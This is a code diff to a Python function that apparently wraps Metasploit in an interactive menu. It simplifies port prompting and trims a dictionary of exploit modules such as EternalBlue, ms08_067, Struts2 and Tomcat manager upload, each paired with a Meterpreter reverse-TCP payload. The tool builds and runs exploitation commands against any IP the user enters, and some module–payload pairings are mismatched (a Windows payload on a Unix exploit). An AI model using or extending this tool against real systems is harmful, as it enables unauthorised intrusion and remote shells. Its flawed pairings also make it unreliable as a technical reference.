@@ -489,7 +489,6 @@ def metasploit_scan():
 
             metasploit_commands = ""
             ip = ""
-            port = ""
 
             if choice == '1':  # Scan for vulnerabilities
                 ip = get_ip_address()  # Assuming get_ip_address() prompts for IP
@@ -497,20 +496,11 @@ def metasploit_scan():
                     print(Fore.RED + "No IP address provided. Returning to the main menu...")
                     return
 
-                port = get_port_number()  # Assuming get_port_number() prompts for Port
-                if not port:
-                    print(Fore.RED + "No port entered. Returning to the main menu...")
-                    return
-                metasploit_commands = f"use auxiliary/scanner/http/http_version\nset RHOSTS {ip}\nset RPORT {port}\nrun"
+                metasploit_commands = f"use auxiliary/scanner/http/http_version\nset RHOSTS {ip}\nrun"
             elif choice == '2':  # Exploit a vulnerability
                 ip = get_ip_address()  # Prompt for IP address
                 if not ip:
                     print(Fore.RED + "No IP address provided. Returning to the main menu...")
-                    return
-
-                port = get_port_number()  # Prompt for Port number
-                if not port:
-                    print(Fore.RED + "No port entered. Returning to the main menu...")
                     return
                 metasploit_commands = input(Fore.BLUE + "Enter your Metasploit commands (separated by newlines):\n")
             elif choice == '4':  # View Network Exploits
@@ -533,15 +523,6 @@ def metasploit_scan():
                     "118": "set PAYLOAD windows/x64/meterpreter/reverse_tcp exploit/multi/http/jboss_deployment_scanner",
                     "120": "exploit/windows/smb/ms17_010_eternalblue set PAYLOAD windows/x64/meterpreter/reverse_tcp",
                     "122": "exploit/multi/http/struts2_code_exec set PAYLOAD windows/x64/meterpreter/reverse_tcp",
-                    "130": "exploit/unix/ftp/vsftpd_234_backdoor set PAYLOAD windows/x64/meterpreter/reverse_tcp",
-                    "140": "exploit/multi/http/jboss_deployment_scanner set PAYLOAD windows/x64/meterpreter/reverse_tcp",
-                    "150": "exploit/multi/http/struts2_code_exec set PAYLOAD windows/x64/meterpreter/reverse_tcp",
-                    "160": "exploit/multi/http/tomcat_mgr_upload set PAYLOAD windows/x64/meterpreter/reverse_tcp",
-                    "170": "exploit/windows/smb/ms17_010_eternalblue set PAYLOAD windows/x64/meterpreter/reverse_tcp",
-                    "180": "exploit/windows/smb/ms08_067_netapi set PAYLOAD windows/x64/meterpreter/reverse_tcp",
-                    "190": "exploit/multi/http/struts2_code_exec set PAYLOAD windows/x64/meterpreter/reverse_tcp",
-                    "200": "exploit/windows/smb/ms08_067_netapi set PAYLOAD windows/x64/meterpreter/reverse_tcp",
-                    "210": "exploit/windows/dcerpc/ms03_026_dcom set PAYLOAD windows/x64/meterpreter/reverse_tcp",
                 }
 
                 # Display available exploits
@@ -551,35 +532,28 @@ def metasploit_scan():
                 exploit_choice = input(Fore.BLUE + "\nEnter the number of the exploit you want to run: ").strip()
 
                 if exploit_choice in exploits:
-                    # Prompt for IP and Port only when choosing an exploit
+                    # Prompt for IP only when choosing an exploit
                     ip = get_ip_address()  # Prompt for IP address
                     if not ip:
                         print(Fore.RED + "No IP address provided. Returning to the main menu...")
-                        return
-
-                    port = get_port_number()  # Prompt for Port number
-                    if not port:
-                        print(Fore.RED + "No port entered. Returning to the main menu...")
                         return
 
                     # Ask user whether to use LHOST or RHOST for the exploit
                     host_type = input(Fore.BLUE + "Do you want to use LHOST or RHOST? ").strip().lower()
 
                     if host_type == 'rhost':
-                        metasploit_commands = f"use {exploits[exploit_choice]}\nset RHOSTS {ip}\nset RPORT {port}\nrun"
+                        metasploit_commands = f"use {exploits[exploit_choice]}\nset RHOSTS {ip}\n"
+                        # Prompt for RPORT only if using RHOST
+                        rport = input(Fore.BLUE + "Enter the RPORT: ").strip()
+                        metasploit_commands += f"set RPORT {rport}\nrun"
                     elif host_type == 'lhost':
-                        metasploit_commands = f"use {exploits[exploit_choice]}\nset LHOST {ip}\nset LPORT {port}\nrun"
+                        metasploit_commands = f"use {exploits[exploit_choice]}\nset LHOST {ip}\n"
+                        # Prompt for LPORT only if using LHOST
+                        lport = input(Fore.BLUE + "Enter the LPORT: ").strip()
+                        metasploit_commands += f"set LPORT {lport}\nrun"
                     else:
                         print(Fore.RED + "Invalid choice. Please select either 'LHOST' or 'RHOST'.")
                         continue  # Ask again if invalid input
-
-                    # Now, prompt to set the corresponding port based on the host type
-                    if host_type == 'rhost':
-                        rport = input(Fore.BLUE + "Enter the RPORT: ").strip()
-                        metasploit_commands = metasploit_commands.replace(f"set RPORT {port}", f"set RPORT {rport}")
-                    elif host_type == 'lhost':
-                        lport = input(Fore.BLUE + "Enter the LPORT: ").strip()
-                        metasploit_commands = metasploit_commands.replace(f"set LPORT {port}", f"set LPORT {lport}")
                 else:
                     print(Fore.RED + "Invalid exploit choice.")
                     continue
